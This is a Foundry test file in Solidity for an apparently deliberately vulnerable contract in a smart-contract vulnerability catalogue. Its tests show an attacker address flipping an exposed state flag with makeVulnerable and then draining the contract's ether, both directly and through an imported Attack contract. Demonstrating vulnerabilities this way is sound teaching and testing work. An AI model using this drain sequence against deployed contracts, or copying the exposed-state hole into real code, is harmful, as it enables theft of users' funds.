pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/6.1.7-Exposed-state-variables-vulnerability.sol";

contract ExposedStateVariablesVulnerabilityTest is Test {
    Stateful public stateful;
    
    // Use a representative attacker address
    address attacker = address(0x1337);

    function setUp() public {
        // deploy the vulnerable contract
        stateful = new Stateful();

        // fund the test contract with Ether
        vm.deal(address(this), 10 ether);
        
        // Send some Ether into the vulnerable contract so there's something to steal
        (bool success, ) = payable(address(stateful)).call{value: 1 ether}('');
        require(success, "Funding failed");

        // Ensure the attacker account has 0 balance initially
        vm.deal(attacker, 0);
    }

    // Test that calling exploit without first setting the vulnerability reverts
    function testExploitFailsWhenNotVulnerable() public {
        vm.prank(attacker);
        vm.expectRevert("Error: Not vulnerable");
        stateful.exploit(payable(attacker));
    }

    // Test that once the vulnerability is exposed, the attacker can drain the funds
    function testSuccessfulExploit() public {
        // Record the attacker's initial balance
        uint initialAttackerBalance = attacker.balance;

        // Attacker opens the vulnerability
        vm.prank(attacker);
        stateful.makeVulnerable();

        // Attacker calls exploit to drain the contract funds
        vm.prank(attacker);
        stateful.exploit(payable(attacker));

        // Assert that the vulnerable contract's balance is now zero
        assertEq(address(stateful).balance, 0, "Contract balance should be zero after exploit");

        // Check that the attacker received the funds (1 ether)
        uint expectedAttackerBalance = initialAttackerBalance + 1 ether;
        assertEq(attacker.balance, expectedAttackerBalance, "Attacker should receive all Ether");
    }

    // Test the attack using the provided Attack contract
    function testAttackContractExploit() public {
        // Record attacker's initial balance (should be 0)
        uint initialAttackerBalance = attacker.balance;
        
        // Deploy the Attack contract from the attacker account
        vm.prank(attacker);
        Attack attackContract = new Attack(stateful);

        // Execute the attack via the Attack contract
        vm.prank(attacker);
        attackContract.attack();

        // The vulnerable contract should have no funds remaining
        assertEq(address(stateful).balance, 0, "Contract balance should be zero after attack contract exploit");

        // The attacker should have received the funds (1 ether)
        uint expectedAttackerBalance = initialAttackerBalance + 1 ether;
        assertEq(attacker.balance, expectedAttackerBalance, "Attacker should receive funds via attack contract exploit");
    }
}
